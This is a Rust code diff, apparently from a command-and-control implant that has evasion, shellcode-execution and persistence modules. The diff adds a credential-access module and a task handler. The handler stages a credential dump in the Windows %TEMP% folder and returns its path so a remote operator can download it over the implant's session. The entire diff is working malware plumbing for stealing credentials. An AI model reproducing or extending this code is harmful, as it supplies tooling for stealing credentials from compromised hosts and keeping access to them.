@@ -26,6 +26,7 @@ mod embedded_config {
     include!(concat!(env!("OUT_DIR"), "/embedded.rs"));
 }
 mod collect;
+mod cred;
 mod evasion;
 mod execshc;
 mod mapper;
@@ -913,6 +914,26 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
             // Host persistence on the session thread (ABR-T030): the
             // registry/SCM calls are blocking, same as the driver arm.
             let (status, data) = match persist::stage(action, &mechanism, &name, &exe, &args) {
+                Ok(data) => (message::STATUS_OK, data),
+                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
+            };
+            send_result(
+                conn,
+                session,
+                profile,
+                TaskResult {
+                    id: task.id,
+                    status,
+                    data,
+                },
+            )
+            .await
+        }
+        TaskBody::Cred { action, arg } => {
+            // Credential access on the session thread (ABR-T032/T033);
+            // the dump lands in %TEMP% and the result is its path —
+            // fetch with `download`.
+            let (status, data) = match cred::stage(action, &arg) {
                 Ok(data) => (message::STATUS_OK, data),
                 Err(e) => (message::STATUS_ERROR, e.into_bytes()),
             };
